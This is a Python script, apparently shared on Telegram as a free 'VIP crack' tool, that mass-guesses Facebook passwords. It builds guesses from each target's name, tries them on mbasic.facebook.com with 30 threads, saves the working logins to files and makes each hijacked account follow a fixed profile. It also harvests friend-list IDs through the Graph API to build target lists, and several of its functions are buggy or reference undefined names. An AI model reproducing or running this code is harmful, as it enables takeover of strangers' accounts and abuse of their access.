
#!/usr/bin/python3
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as sarfrazssb
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0

proxy = requests.get('https://raw.githubusercontent.com/ramzantanha/RamXan/main/tr.txt').text.splitlines()
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo =                                          """   
 \033[1;94m
██████  ███████ ███    ███ ███    ██  █████  ████████ 
██   ██ ██      ████  ████ ████   ██ ██   ██    ██    
██████  █████   ██ ████ ██ ██ ██  ██ ███████    ██    
██   ██ ██      ██  ██  ██ ██  ██ ██ ██   ██    ██    
██████  ███████ ██      ██ ██   ████ ██   ██    ██    
                                                      
                                                      

\33[1;32m  TELGRAM : @kurd_kurd129
\33[1;32m  CHANNEL : https://t.me/TOOLS_TERMUX1
\33[1;32m  VERSION : 1.0
\33[1;32m  THIS TOOL IS PAID【freeee】
"""

def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mGURGA-OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mGURGA-CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPRESS ENTER TO BACK GURGA MENU ")
	    Gurga()

def Gurga():
    os.system('clear')
    print(logo)
    todz = ''
    print
    print('    \x1b[1;32m1[VIP] CRACK  FILE')
    print('   \033[1;91m ---------------------------') 
    _Gurga___ = input('    \x1b[1;34mHALBZHERA: ')
    if _Gurga___ in ('1', '01'):
        __xxx__().Gurgax(id)
    os.system("xdg-open https://t.me/TOOLS_TERMUX1 ")
class __xxx__:
    def __init__(self):
        self.id = []
    def Gurgax(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input(' \033[1;32mNAME FILE : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One');
            self.Gurgax(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;32m[GURGA] \x1b[1;34m{loop}|\x1b[1;32m{len(self.id)} \x1b[1;92m{len(ok)}\x1b[1;32m/\x1b[1;31m{len(cp)}")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    'authority': 'mbasic.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'max-age=0',
                    'dpr': '2.75',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-model': '"M2102J20SG"',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-ch-ua-platform-version': '"12.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                    'viewport-width': '980',}

                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    'authority': 'mbasic.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'max-age=0',
                    'dpr': '2.75',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-model': '"M2102J20SG"',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-ch-ua-platform-version': '"12.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                    'viewport-width': '980',}
                
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [💚BEMNAT-OK💚︎] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('GURGA-OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s [BEMNAT-CP︎] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('BEMNAT-CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    print('\r%s [BEMNAT-CP︎] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('GURGA-CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('\033[1;32m[1] \033[1;32m CARCK BAHEZ ')
        print('\033[1;31m-----------------------------------------------')
        chi = input('\33[1;34m HALBZHERA: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print("\033[1;32mCRACKING  VIP")
            print('\033[1;34m HAMW ID : %s ' % len(self.id))
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.capitalize()
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl, xz[0]+"00998877", xz[0]+"1234554321", xz[0]+"12345", xz[0]+"11223344", xz[0]+"123", xz[0]+"1234", xz[0]+"2000", xz[0]+"1999", xz[0]+"1998", xz[0]+"2001", xz[0]+"2002", xz[0]+"2003", xz[0]+"2004", xz[0]+"2005", xz[0]+"2022", xz[0]+"2021", xz[0]+"@1234", xz[0]+"1234@", xz[0]+"####", xz[0]+"0750", xz[0]+"112223", xz[0]+"0780", xz[0]+"1122334455", xz[0]+"0987", xz[0]+"123123", xz[0]+"123321", xz[0]+"100200", xz[0]+"1234567890", xz[0]+"2006", xz[0]+"2007", xz[0]+"2008", xz[0]+"2009", xz[0]+"2010", xz[0]+"1234512345", xz[0]+"11", xz[0]+"5544332211", xz[0]+"332211", xz[0]+"@@@@", xz[0]+"2222", xz[0]+"5555", xz[0]+"6666", xz[0]+"7777", xz[0]+"8888", xz[0]+"####1111", xz[0]+"****", xz[0]+"3333", xz[0]+"00", xz[0]+"11002299"]
                        else:
                            pwx = [firstl+' '+lastl, xz[0]+"00998877", xz[0]+"1234554321", xz[0]+"12345", xz[0]+"11223344", xz[0]+"123", xz[0]+"1234", xz[0]+"2000", xz[0]+"1999", xz[0]+"1998", xz[0]+"2001", xz[0]+"2002", xz[0]+"2003", xz[0]+"2004", xz[0]+"2005", xz[0]+"2022", xz[0]+"2021", xz[0]+"@1234", xz[0]+"1234@", xz[0]+"####", xz[0]+"0750", xz[0]+"112223", xz[0]+"0780", xz[0]+"1122334455", xz[0]+"0987", xz[0]+"123123", xz[0]+"123321", xz[0]+"100200", xz[0]+"1234567890", xz[0]+"2006", xz[0]+"2007", xz[0]+"2008", xz[0]+"2009", xz[0]+"2010", xz[0]+"1234512345", xz[0]+"11", xz[0]+"5544332211", xz[0]+"332211", xz[0]+"@@@@", xz[0]+"2222", xz[0]+"5555", xz[0]+"6666", xz[0]+"7777", xz[0]+"8888", xz[0]+"####1111", xz[0]+"****", xz[0]+"3333", xz[0]+"00", xz[0]+"11002299"]
                            pwx = [firstl+' '+lastl, xz[0]+"00998877", xz[0]+"1234554321", xz[0]+"12345", xz[0]+"11223344", xz[0]+"123", xz[0]+"1234", xz[0]+"2000", xz[0]+"1999", xz[0]+"1998", xz[0]+"2001", xz[0]+"2002", xz[0]+"2003", xz[0]+"2004", xz[0]+"2005", xz[0]+"2022", xz[0]+"2021", xz[0]+"@1234", xz[0]+"1234@", xz[0]+"####", xz[0]+"0750", xz[0]+"112223", xz[0]+"0780", xz[0]+"1122334455", xz[0]+"0987", xz[0]+"123123", xz[0]+"123321", xz[0]+"100200", xz[0]+"1234567890", xz[0]+"2006", xz[0]+"2007", xz[0]+"2008", xz[0]+"2009", xz[0]+"2010", xz[0]+"1234512345", xz[0]+"11", xz[0]+"5544332211", xz[0]+"332211", xz[0]+"@@@@", xz[0]+"2222", xz[0]+"5555", xz[0]+"6666", xz[0]+"7777", xz[0]+"8888", xz[0]+"####1111", xz[0]+"****", xz[0]+"3333", xz[0]+"00", xz[0]+"11002299"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            os.remove(self.apk)
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()

def create_file():
    os.system('clear')
    print(logo)
    print('  [1] Create file manual')
    print('  [2] Create file auto')
    print('  [B] Back to main menu')
    print(50*'-')
    cf = input('  Choose method: ')
    if cf =='1':
        manual()
    elif cf =='2':
        auto()
    elif cf =='3':
        likes()
    elif cf =='3' or cf =='b' or cf =='B':
        main()
    else:
        print('\n  Choose correct option ...')
        time.sleep(1)
        create_file()

def manual():
    try:
        token = open('/sdcard/tokenofl.txt', 'r').read()
    except FileNotFoundError:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+token).text
        q = json.loads(r)
        uname = q['name']
    except (KeyError):
        login()
    os.system('clear')
    print(logo)
    print('  Name: '+uname)
    print(50*'-')
    limit = int(input('  How many ids do you want to add ? '))
    save_file = input('  Save file as: ')
    t = 0
    for u in range(limit):
        t+=1
        try:
            ids = input('  Put id no%s: '%t)
            r = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+token).text
            q = json.loads(r)
            for j in q['data']:
                uids = j['id']
                names = j['name']
                first_name = names.split(' ')[0]
                try:
                    last_name = names.split(' ')[1]
                except:
                    last_name = 'Khan'
                with open('/sdcard/'+save_file, 'a') as rd:
                    rd.write(uids+'|'+first_name+'|'+last_name+'\n')
        except KeyError:
            print('  No friend for '+ids)
            pass
    print(50*'-')
    print('  Ids saved as: '+save_file)
    print(50*'-')
    input(' Press enter to back')
    Gurga()
    
def auto():
    os.system('rm -rf temp*')
    try:
        access_token = open('/sdcard/tokenofl.txt', 'r').read()
    except:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+access_token).text
        q = json.loads(r)
        uname = q['name']
    except:
        login()
    os.system('clear')
    print(logo)
    print('  Logged user: '+uname)
    print(50*'-')
    nusrat = []
    try:
        limit_user = int(input('  How many ids do you want to add ? '))
    except:
        limit_user = 1
    count = 0
    for fir in range(limit_user):
        count +=1
        udit = input('  Put id%s: '%(count))
        try:
            tfile = open('/sdcard/tokenofl.txt','r').read()
            fr = requests.get('https://graph.facebook.com/'+udit+'/friends?limit=5000&access_token='+tfile).text
            qfr = json.loads(fr)
            temp_save = open('temp.txt', 'a')
            for data in qfr['data']:
                uids = data['id']
                if uids in nusrat:
                    pass
                else:
                    nusrat.append(uids)
                    temp_save.write(uids+'\n')
            temp_save.close()
        except KeyError:
            if 'invalid' in str(fr):
                print('  Logged token has expired ...')
                pass
            else:
                print('  No friends found for user: '+udit)
                pass
    os.system('clear')
    print(logo)
    print('   Total ids: '+str(len(nusrat)))
    print(50*'-')
    try:
        ask_link = int(input('  How many links do you want to grab? '))
    except:
        ask_link = 1
    completed = 0
    for links in range(ask_link):
        completed +=1
        li = input('  %s Link start with: '%completed)
        os.system('cat temp.txt | grep "'+li+'" >> temp2.txt')
    save_file = input('  Save file as: ')
    os.system('clear')
    lines = open('temp2.txt', 'r').readlines()
    print(logo)
    print('  Total ids to grab: '+str(len(lines)))
    print('  Grabbing Process has started')
    print(50*'-')
    fileid = 'temp2.txt'
    fileidopen = open(fileid, 'r').read().splitlines()
    dill = []
    for ids in fileidopen:
        try:
            tfile = open('/sdcard/tokenofl.txt','r').read()
            rg = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+tfile).text
            rgq = json.loads(rg)
            idsave=open('/sdcard/'+save_file, 'a')
            for inayat in rgq['data']:
                uids = inayat['id']
                dill.append(uids)
                nm = inayat['name']
                first_name = nm.split(' ')[0]
                try:
                    last_name = nm.split(' ')[1]
                except:
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+'|'+last_name+'\n')
            print('  Grabbed from: '+ids)
           # print('  Total friends: '+str(len(uids)))
            print('  Token status: Live')
            print(50*'-')
            idsave.close()
        except Exception as e:
            #print(e)
            if 'invalid' in str(rg):
                print('  Token has expired, try again ...')
                os.system('rm -rf temp*')
                pass
            else:
                print('  Grabbed from: '+ids)
                print('  Friendlist ids: 0')
                print('  Token status: Live')
                print(50*'-')
                os.system('rm -rf temp*')
                pass
    lenid = open('/sdcard/'+save_file, 'r').readlines()
    print('  Grabbing Process has completed ')
    os.system('rm -rf temp*')
    print('  Total ids grabbed: '+str(len(lenid)))
    print('  File saved as: /sdcard/'+save_file)
    print(50*'-')
    input('  Press enter to back ')
    safraz()
def dupcutter():
	os.system('clear');print(logo)
	print("[+] Example : /sdcard/your_file_name.txt  \n\n")
	Mahar = input('[+] File Path   : ')
	Armsty = input('[+] New File Save As : ')
	os.system('touch ' +Armsty)
	os.system('sort -r '+Mahar+' | uniq > '+Armsty)
	print("")
	print("")
	print(54*"\033[1;33m_")
	print("")
	print("[+] Removing Successful  From File " + Mahar )
	print("[+] New File Save " + Armsty )
	print(54*"\033[1;33m_")
	time.sleep(2)
    
    
    
Gurga()
